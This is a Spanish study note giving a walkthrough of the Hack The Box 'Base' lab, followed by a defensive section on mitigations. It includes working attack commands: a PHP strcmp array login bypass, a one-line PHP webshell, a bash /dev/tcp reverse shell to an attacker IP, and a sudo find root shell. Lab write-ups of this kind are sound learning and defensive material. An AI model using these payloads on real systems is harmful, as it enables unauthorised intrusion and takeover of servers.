---
title: Base (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, php, type-juggling, file-upload, webshell, credential-reuse, sudo, gtfobins, privesc]
type: nota
status: en-progreso
source: claude-code
aliases: [Base HTB, HTB Base, base starting point]
---

# Base — HTB Starting Point (Tier 2)

**Tier 2 · SO: Linux · Dificultad: Very Easy · Skills: PHP type juggling, file upload / webshell, reutilizacion de credenciales, sudo + GTFOBins**

Maquina que encadena cuatro vulnerabilidades clasicas: un bypass de login por confusion de tipos en PHP, subida de webshell para RCE, reutilizacion de la contrasena de base de datos en el sistema operativo, y finalmente escalada via sudo mal configurado. El flujo completo ilustra como una sola debilidad de codigo puede abrir la puerta hasta root.

> HTB Starting Point es un laboratorio legal y autorizado por Hack The Box para aprender tecnicas de pentesting en un entorno controlado.

---

## Objetivo

Obtener una shell como `www-data` mediante bypass de login y webshell, escalar a un usuario del sistema reutilizando credenciales de base de datos, y llegar a root aprovechando un binario permitido en `sudo`.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoria: descubrimiento de servicios con nmap.**

```bash
nmap -sV -sC -p- --min-rate 5000 <IP>
```

Resultado relevante:

```
22/tcp  open  ssh     OpenSSH 7.9p1
80/tcp  open  http    Apache httpd 2.4.38
```

- Puerto 22: SSH disponible, util mas adelante cuando tengamos credenciales validas.
- Puerto 80: aplicacion web PHP en Apache. Es el vector de entrada principal.

---

## Enumeracion

### Directory brute-force — descubrir rutas y backups

**Categoria: enumeracion de superficie HTTP.**

```bash
gobuster dir -u http://<IP> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
  -x php,swp,bak,txt
```

Gobuster encuentra dos elementos clave:

| Ruta | Descripcion |
|---|---|
| `/login/login.php` | Formulario de autenticacion PHP |
| `/login/login.php.swp` | Fichero de swap de vim — backup del codigo fuente |

> El fichero `.swp` es un artefacto que vim crea automaticamente al editar. Si el servidor lo sirve, cualquiera puede descargar el codigo fuente del script de login sin autenticarse.

### Lectura del codigo fuente via fichero .swp

Descargar el backup:

```bash
wget http://<IP>/login/login.php.swp
# Recuperar el fichero original desde el swap de vim:
vim -r login.php.swp
# O con strings para una lectura rapida:
strings login.php.swp
```

El codigo fuente revela la logica de comparacion del login. Buscamos como se validan usuario y contrasena. La linea critica sera similar a:

```php
if (strcmp($_POST['username'], $username) == 0 && strcmp($_POST['password'], $password) == 0) {
    // autenticado
}
```

La funcion `strcmp` comparada con `== 0` (igualdad laxa) es el vector de type juggling.

---

## Acceso inicial (foothold)

### Paso 1 — Bypass de login por PHP type juggling (strcmp con array)

**Categoria: vulnerabilidad de logica — comparacion de tipos debil (CWE-843).**

**El patron:** en PHP, `strcmp(array, string)` no lanza un error sino que devuelve `NULL`. Con el operador `==` (igualdad laxa), `NULL == 0` evalua a `true`. Por tanto, enviar el parametro de contrasena como un array vacia la comparacion y autentica sin conocer la contrasena real.

Enviar la peticion de login con los parametros como arrays:

```bash
curl -s -X POST http://<IP>/login/login.php \
  -d "username[]=admin&password[]=cualquiercosa" \
  -L -c cookies.txt | grep -i "flag\|welcome\|upload\|dashboard"
```

O desde Burp Suite / navegador modificando el body:

```http
POST /login/login.php HTTP/1.1
Host: <IP>
Content-Type: application/x-www-form-urlencoded

username[]=admin&password[]=x
```

> En vivo: el nombre del parametro (`username`, `password`) puede variar. Verificarlo en el HTML del formulario o en el codigo fuente recuperado del `.swp` antes de enviar la peticion.

Si el bypass funciona, la respuesta redirige a un panel de administracion con capacidad de subida de ficheros.

### Paso 2 — Subida de webshell PHP para RCE

**Categoria: unrestricted file upload → Remote Code Execution.**

Crear una webshell minima:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Subir el fichero desde el panel de uploads (usando el navegador o curl con la cookie de sesion obtenida en el paso anterior):

```bash
curl -s -X POST http://<IP>/upload.php \
  -b cookies.txt \
  -F "file=@shell.php"
```

Localizar donde se almacenan los uploads (gobuster o la respuesta del servidor lo indica — tipicamente `/uploads/` o similar). Ejecutar comandos:

```bash
curl "http://<IP>/uploads/shell.php?cmd=id"
# Respuesta esperada: uid=33(www-data) gid=33(www-data)
```

Obtener una reverse shell interactiva:

```bash
# En tu maquina atacante, abrir listener:
nc -lvnp 4444

# Desde la webshell, lanzar la reverse shell (URL-encoded):
curl "http://<IP>/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<TU_IP>/4444+0>%261'"
```

Ahora tienes una shell como `www-data`.

---

## Escalada de privilegios

### Paso 3 — Reutilizacion de credenciales: BD → usuario del sistema

**Categoria: credential reuse entre capa de aplicacion y SO.**

Buscar el fichero de configuracion de la aplicacion para extraer credenciales de base de datos:

```bash
find /var/www -name "config.php" 2>/dev/null
cat /var/www/html/config.php   # ajustar ruta segun la estructura real
```

El fichero contendra algo como:

```php
$db_user = "admin";
$db_pass = "<contrasena-de-bd>";
```

Comprobar si esa contrasena esta reutilizada por algun usuario del sistema:

```bash
cat /etc/passwd | grep -v "nologin\|false"
# Identificar usuarios con shell valida (por ejemplo: john, admin, etc.)

su <usuario>
# Introducir la contrasena encontrada en config.php
```

> En vivo: el nombre del usuario del sistema puede no coincidir con `admin`. Revisar `/etc/passwd` para identificar que cuentas tienen una shell real asignada (`/bin/bash`, `/bin/sh`).

### Paso 4 — Privesc via sudo + GTFOBins

**Categoria: sudo misconfiguration → privilege escalation.**

Con el usuario del sistema comprometido, revisar permisos de sudo:

```bash
sudo -l
```

Salida tipica en esta maquina:

```
User <usuario> may run the following commands on base:
    (root) NOPASSWD: /usr/bin/find
```

El binario `find` esta en GTFOBins con vector de escalada directa:

```bash
sudo find . -exec /bin/bash \; -quit
# o bien:
sudo find /etc/passwd -exec /bin/sh \;
```

Esto abre una shell como `root`.

---

## Flags

| Flag | Ubicacion tipica |
|---|---|
| `user.txt` | `/home/<usuario>/user.txt` — accesible tras el `su` al usuario del sistema |
| `root.txt` | `/root/root.txt` — accesible tras la escalada con sudo+find |

Las flags tienen el formato `HTB{<flag>}`. En Starting Point Tier 2 suele haber dos flags separadas (una por nivel de acceso).

```bash
# Flag de usuario
cat /home/<usuario>/user.txt

# Flag de root
cat /root/root.txt
```

---

## Patron y teoria

### El patron: cadena de cuatro eslabones clasicos

**Schema general: exposicion de codigo fuente → logica de autenticacion rota → upload sin restricciones → credenciales compartidas → sudo permisivo.**

Cada eslаbon es independientemente conocido, pero encadenados llevan de visitante anonimo a root en una sola sesion:

```
Recon (gobuster) → .swp expone codigo fuente
    → PHP type juggling (strcmp + array) bypasea login
    → File upload sin validacion → webshell → RCE como www-data
    → config.php con contrasena BD en texto plano
    → Reutilizacion en SO (su) → usuario del sistema
    → sudo -l revela find sin restriccion → GTFOBins → root
```

Este flujo es representativo del mundo real: los atacantes rara vez explotan una sola CVE critica; encadenan debilidades de configuracion y logica que por separado parecen "menores".

---

### Eslаbon 1: PHP type juggling

**Vulnerabilidad:** `strcmp()` con el operador `==` acepta arrays porque devuelve `NULL` y `NULL == 0` es `true` en PHP (comparacion laxa).

**La regla de diseño:** usar siempre `===` (identidad estricta) para comparar credenciales. Mejor aun: no implementar autenticacion a mano — usar una libreria probada (Symfony Security, Laravel Auth, etc.) que internamente utiliza `hash_equals()` para comparaciones de tiempo constante.

```php
// MAL — vulnerable
if (strcmp($_POST['password'], $password) == 0) { ... }

// BIEN — comparacion estricta y de tiempo constante
if (hash_equals($password, $_POST['password'])) { ... }
```

---

### Eslаbon 2: file upload sin restricciones

**Vulnerabilidad:** el servidor acepta y ejecuta cualquier fichero subido, incluidos `.php`.

**La regla de diseño:**
- Validar el tipo por contenido (`finfo_file()`), nunca solo por extension.
- Almacenar uploads fuera del document root o en un bucket de objeto.
- Servir ficheros subidos con un Content-Type forzado a `application/octet-stream` para que el servidor no los interprete.
- Nunca dar permisos de ejecucion a directorios de uploads.

---

### Eslаbon 3: credenciales de BD en texto plano reutilizadas en el SO

**Vulnerabilidad:** `config.php` guarda la contrasena en texto plano y ademas esa contrasena es la misma que la del usuario del sistema operativo.

**La regla de diseño:**
- Los secretos de aplicacion van en variables de entorno o en un vault (HashiCorp Vault, AWS Secrets Manager, Docker Secrets). Nunca hardcodeados en ficheros del repositorio.
- Una contrasena = un servicio. La contrasena de la BD no puede ser la misma que la del usuario SSH.
- Auditar periodicamente si `.env`, `config.php`, `database.yml`, etc. estan en el `.gitignore` y no son accesibles por el servidor web. Ver [[04-seguridad-web-owasp]] (A05: Security Misconfiguration).

---

### Eslаbon 4: sudo + GTFOBins

**Vulnerabilidad:** `find` con `sudo NOPASSWD` permite ejecucion de subprocesos arbitrarios como root via `-exec`.

**La regla de diseño:**
- Principio de minimo privilegio en sudo: si un proceso necesita leer un fichero root, dale acceso a ese fichero concreto, no a un binario de proposito general.
- Auditar `/etc/sudoers` regularmente. Cualquier binario en [GTFOBins](https://gtfobins.github.io/) con capacidad `sudo` es un vector de escalada.
- Preferir capabilities de Linux (`CAP_NET_BIND_SERVICE`, etc.) sobre sudo cuando sea posible.
- Ver [[06-seguridad-de-sistemas-y-hardening]] para hardening de sudo y politicas de minimo privilegio.

---

### Resumen defensivo (purple team)

| Punto de fallo | Mitigacion tecnica |
|---|---|
| `.swp` accesible en web | `.htaccess` o `nginx.conf` para bloquear extensiones de backup (`*.swp`, `*.bak`, `~`) |
| `strcmp` con `==` | Usar `hash_equals()` o libreria de auth estandar; tests unitarios con parametros array |
| Upload sin validacion | Validar por magic bytes, almacenar fuera del document root, no ejecutar uploads |
| Contrasena BD en texto plano y reutilizada | Secrets manager + rotacion; politica de unicidad de contrasenas por servicio |
| sudo + find | Auditar sudoers; eliminar binarios de GTFOBins de la lista permitida |

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
